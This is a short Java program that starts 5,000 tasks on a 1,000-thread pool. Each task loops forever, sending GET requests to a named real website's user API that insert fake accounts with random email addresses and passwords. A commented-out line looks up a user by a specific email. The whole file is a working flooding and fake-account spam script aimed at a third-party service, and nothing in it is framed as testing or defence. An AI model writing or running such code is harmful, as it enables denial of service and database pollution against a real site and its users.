import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class Main {

	public static void main(String args[]) {
		ExecutorService threadService = Executors.newFixedThreadPool(1000);
		for (int i = 1; i <= 5000; i++) {
			System.out.println(i+"thread has been started");
			threadService.execute(new Thread(new Runnable() {

				@Override
				public void run() {
					CloseableHttpClient client = HttpClients.createDefault();
					boolean flag = true;
					try {
						while (flag) {
							HttpGet get = new HttpGet(
									//"http://www.eluying.net/api/access.php?method=user&type=getidbyfield&id=1605440954@qq.com&field=email&callback=?"
									"http://www.eluying.net/api/access.php?method=user&type=insert&arg1=&arg2="+new Random().nextInt(200000000)+"@qq.com"+"&arg3="+new Random().nextInt(1000000)+"+&arg4=&arg5=&arg6=&arg7=0&arg8="+new Date().getTime()+"&arg9=0&callback=?");
							CloseableHttpResponse response = client
									.execute(get);
							// response.get
							System.out.println(response.getStatusLine());
							InputStream ips = response.getEntity().getContent();
							BufferedReader br = new BufferedReader(
									new InputStreamReader(ips));
							String backMsg = br.readLine();
							while (backMsg != null) {
								System.out.println(backMsg);
								backMsg = br.readLine();
							}
							// if(response.getStatusLine().getStatusCode()!=503){System.out.println(response.getEntity().getContentLength());break;}
							response.close();
							Thread.sleep(500);
						}
					} catch (IOException | InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}));

		}
	}

}
